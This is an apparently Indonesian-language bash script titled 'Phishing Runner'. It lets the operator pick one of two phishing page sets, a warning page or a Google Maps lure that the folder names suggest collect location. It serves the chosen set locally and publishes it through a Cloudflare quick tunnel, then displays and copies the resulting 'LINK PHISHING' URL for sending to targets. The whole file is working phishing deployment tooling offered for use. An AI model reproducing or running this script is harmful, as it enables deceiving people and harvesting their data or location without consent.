#!/bin/bash
# Phishing Runner - Quick Tunnel (link cloudflared)
# Usage: ./run.sh

DIR="$(cd "$(dirname "$0")" && pwd)"
PORT=8080
SHOWN_FLAG="/tmp/.phish_shown_$$"

# Auto-check requirements
if ! command -v python3 &> /dev/null && ! command -v python &> /dev/null; then
    echo "[!] Python 3 belum terinstall. Jalankan: ./setup.sh"
    exit 1
fi
if ! command -v cloudflared &> /dev/null; then
    echo "[!] Cloudflared belum terinstall. Jalankan: ./setup.sh"
    exit 1
fi

echo ""
echo "═══════════════════════════════════════"
echo "  PHISHING RUNNER"
echo "═══════════════════════════════════════"
echo ""
echo "  [1] V1 - Warning Page"
echo "  [2] V2 - Google Maps"
echo ""
read -p "  Pilih (1/2): " CHOICE

case $CHOICE in
    1)
        MODE="V1"
        SRCDIR="$DIR/lokasi"
        ;;
    2)
        MODE="V2"
        SRCDIR="$DIR/lokasi-v2"
        ;;
    *)
        echo "  Pilihan tidak valid."
        exit 1
        ;;
esac

echo ""
echo "[*] Mode: $MODE"
echo "[*] Matikan server lama di port $PORT..."
fuser -k $PORT/tcp 2>/dev/null
sleep 1

echo "[*] Start HTTP server di port $PORT..."
cd "$SRCDIR" && python3 -m http.server $PORT &
SERVER_PID=$!
sleep 1

echo "[*] Start Cloudflare Quick Tunnel..."
echo "[*] ─────────────────────────────────────"
echo ""

cloudflared tunnel --url http://localhost:$PORT 2>&1 | while read -r line; do
    if echo "$line" | grep -qE "https://[a-z0-9-]+\.trycloudflare\.com" && [ ! -f "$SHOWN_FLAG" ]; then
        URL=$(echo "$line" | grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" | head -1)
        touch "$SHOWN_FLAG"
        echo ""
        echo "═══════════════════════════════════════"
        echo "  🔗 LINK PHISHING ($MODE):"
        echo "  $URL"
        echo "═══════════════════════════════════════"
        echo ""
        if command -v xdg-open &> /dev/null; then
            xdg-open "$URL" &> /dev/null &
        elif command -v open &> /dev/null; then
            open "$URL"
        elif command -v cmd.exe &> /dev/null; then
            cmd.exe /c start "$URL" &> /dev/null
        fi
        if command -v xclip &> /dev/null; then
            echo "$URL" | xclip -selection clipboard
            echo "  📋 Link copied to clipboard!"
        elif command -v wl-copy &> /dev/null; then
            echo "$URL" | wl-copy
            echo "  📋 Link copied to clipboard!"
        fi
        echo "  🌐 Browser opened!"
        echo ""
    fi
    if echo "$line" | grep -qE "ERR|error|failed|Failed"; then
        echo "  [error] $line"
    fi
done

trap "kill $SERVER_PID 2>/dev/null; rm -f $SHOWN_FLAG; exit" SIGINT SIGTERM EXIT
rm -f "$SHOWN_FLAG"
wait
